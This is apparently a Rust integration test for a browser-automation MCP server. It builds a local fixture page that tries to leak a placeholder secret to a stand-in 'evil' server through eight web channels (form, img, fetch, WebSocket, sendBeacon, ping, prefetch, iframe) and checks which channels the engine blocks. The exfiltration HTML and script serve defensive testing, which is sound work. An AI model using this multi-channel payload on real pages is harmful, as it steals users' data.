//! W4.D1 gate: the 8-channel exfil fixture. An in-set page tries to reach evil.test through every
//! channel (form POST, img query, fetch POST, WebSocket, sendBeacon, <a ping>, <link rel=prefetch>,
//! iframe navigation). Arms: `open` (no grants; proves the fixture can leak), `manuk` (engine arm,
//! must be 0/8), `chrome` (cdp-layer arm: MEASURED, printed, never assumed). Per-arm counts go to
//! target/exfil8.tsv. `MANUK_SCOPE_MUTATE=1` disables the engine check and the manuk arm must go red.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::sync::{Arc, Mutex};

use serde_json::{json, Value};

type Log = Arc<Mutex<Vec<String>>>;

const CHANNELS: [&str; 8] = [
    "form", "img", "fetch", "ws", "beacon", "ping", "prefetch", "frame",
];

fn serve(evil: &str) -> (String, Log) {
    let log: Log = Arc::default();
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    let evil = evil.to_string();
    let lg = log.clone();
    std::thread::spawn(move || {
        for s in l.incoming() {
            let Ok(mut s) = s else { continue };
            let (lg, evil) = (lg.clone(), evil.clone());
            std::thread::spawn(move || {
                let mut buf = [0u8; 8192];
                let n = s.read(&mut buf).unwrap_or(0);
                let first = String::from_utf8_lossy(&buf[..n])
                    .lines()
                    .next()
                    .unwrap_or("")
                    .to_string();
                let mut it = first.split_whitespace();
                let (m, p) = (it.next().unwrap_or(""), it.next().unwrap_or(""));
                if p != "/favicon.ico" && !first.is_empty() {
                    lg.lock().unwrap().push(format!("{m} {p}"));
                }
                let page = if evil.is_empty() {
                    "<html><body>evil side</body></html>".to_string()
                } else {
                    let ws = evil.replace("http://", "ws://");
                    format!(
                        r#"<!doctype html><html><head><title>Exfil</title>
<link rel="prefetch" href="{evil}/prefetch?d=SECRET">
</head><body><h1>Exfil page</h1>
<img src="{evil}/img?d=SECRET">
<iframe src="{evil}/frame?d=SECRET"></iframe>
<script>
fetch("{evil}/fetch", {{method: "POST", body: "SECRET"}}).catch(function () {{}});
try {{ var w = new WebSocket("{ws}/ws?d=SECRET"); w.onopen = function () {{ w.send("SECRET"); }}; w.onerror = function () {{}}; }} catch (e) {{}}
try {{ navigator.sendBeacon("{evil}/beacon", "SECRET"); }} catch (e) {{}}
</script>
<form method="post" action="{evil}/form"><input name="d" value="SECRET"><button id="p">Post out</button></form>
<a href="{app}/dest" ping="{evil}/ping?d=SECRET">Follow link</a>
</body></html>"#,
                        app = format!("http://{}", s.local_addr().unwrap())
                    )
                };
                let _ = write!(s, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{page}", page.len());
            });
        }
    });
    (format!("http://{addr}"), log)
}

struct Client {
    child: Child,
    tx: ChildStdin,
    rx: BufReader<ChildStdout>,
    id: u64,
}

impl Client {
    fn start(chrome: bool, flags: &[String]) -> Client {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_manuk-mcp"));
        cmd.args(flags);
        if chrome {
            cmd.args(["--backend", "chrome"]);
        }
        cmd.env(
            "MANUK_ACTLOG_DIR",
            std::env::temp_dir().join(format!("w39-log-{}-{chrome}", std::process::id())),
        );
        cmd.arg("--allow-write").arg(std::env::temp_dir());
        let mut child = cmd
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .expect("spawn manuk-mcp");
        let tx = child.stdin.take().unwrap();
        let rx = BufReader::new(child.stdout.take().unwrap());
        let mut c = Client {
            child,
            tx,
            rx,
            id: 0,
        };
        c.rpc("initialize", json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}));
        c.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
        c
    }
    fn send(&mut self, v: Value) {
        writeln!(self.tx, "{v}").unwrap();
        self.tx.flush().unwrap();
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.id += 1;
        let id = self.id;
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        loop {
            let mut line = String::new();
            assert!(
                self.rx.read_line(&mut line).unwrap() > 0,
                "server closed stdout"
            );
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["id"] == json!(id) {
                return v;
            }
        }
    }
    fn call(&mut self, name: &str, args: Value) -> (bool, String) {
        let r = self.rpc("tools/call", json!({"name": name, "arguments": args}));
        let res = &r["result"];
        let blocks = res["content"].as_array().cloned().unwrap_or_default();
        (
            res["isError"].as_bool().unwrap_or(false),
            blocks
                .iter()
                .filter_map(|b| b["text"].as_str())
                .collect::<Vec<_>>()
                .join("\n"),
        )
    }
    fn ok(&mut self, name: &str, args: Value) -> String {
        let (e, t) = self.call(name, args);
        assert!(!e, "{name} failed: {t}");
        t
    }
    fn refused(&mut self, name: &str, args: Value, needle: &str) {
        let (e, t) = self.call(name, args);
        assert!(
            e && t.contains(needle),
            "{name}: expected an error containing {needle:?}, got error={e}: {t}"
        );
    }
}
impl Drop for Client {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn handle_of(text: &str, needle: &str) -> String {
    let line = text
        .lines()
        .find(|l| l.contains(needle))
        .unwrap_or_else(|| panic!("no {needle:?} in:\n{text}"));
    let s = line.find("[h").unwrap();
    let e = line[s..].find(']').unwrap() + s;
    line[s + 1..e].to_string()
}

/// Run one arm; returns per-channel evil request-line counts.
fn arm(name: &str, chrome: bool, grants: bool) -> Vec<(&'static str, usize)> {
    let (evil, evil_log) = serve("");
    let (app, _app_log) = serve(&evil);
    let flags = if grants {
        vec![
            "--read-origins".to_string(),
            app.clone(),
            format!("--write-origins={app}"),
        ]
    } else {
        vec![]
    };
    let mut c = Client::start(chrome, &flags);
    let nav = c.ok("navigate", json!({"url": format!("{app}/")}));
    std::thread::sleep(std::time::Duration::from_millis(1000));
    assert!(
        nav.contains("Exfil page"),
        "fixture page did not load:\n{nav}"
    );
    let _ = c.call(
        "act",
        json!({"handle": handle_of(&nav, "button \"Post out\""), "action": "click"}),
    );
    let nav2 = c.ok("observe", json!({}));
    if nav2.contains("Follow link") {
        let _ = c.call(
            "act",
            json!({"handle": handle_of(&nav2, "Follow link"), "action": "click"}),
        );
    }
    std::thread::sleep(std::time::Duration::from_millis(1200));
    let seen = evil_log.lock().unwrap().clone();
    let counts: Vec<_> = CHANNELS
        .iter()
        .map(|ch| {
            (
                *ch,
                seen.iter()
                    .filter(|r| {
                        r.split_whitespace()
                            .nth(1)
                            .is_some_and(|p| p.starts_with(&format!("/{ch}")))
                    })
                    .count(),
            )
        })
        .collect();
    let blocked = counts.iter().filter(|(_, n)| *n == 0).count();
    let line = format!(
        "{name}\tchrome_ver=145.0.7632.116\tblocked={blocked}/8\t{}",
        counts
            .iter()
            .map(|(c, n)| format!("{c}={n}"))
            .collect::<Vec<_>>()
            .join(" ")
    );
    eprintln!("EXFIL8 {line}");
    use std::io::Write as _;
    let mut f = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(concat!(env!("CARGO_MANIFEST_DIR"), "/../target/exfil8.tsv"))
        .unwrap();
    writeln!(f, "{line}").unwrap();
    counts
}

#[test]
fn engine_arm_blocks_all_eight_channels() {
    let c = arm("manuk-granted", false, true);
    assert!(c.iter().all(|(_, n)| *n == 0), "engine arm leaked: {c:?}");
}

#[test]
fn open_arm_leaks_so_the_fixture_can_go_red() {
    let c = arm("manuk-open", false, false);
    assert!(
        c.iter().filter(|(_, n)| *n > 0).count() >= 4,
        "fixture barely leaks even unrestricted: {c:?}"
    );
}

#[test]
fn cdp_layer_arm_is_measured() {
    let c = arm("chrome-granted", true, true);
    eprintln!("cdp-layer arm: {c:?}");
}
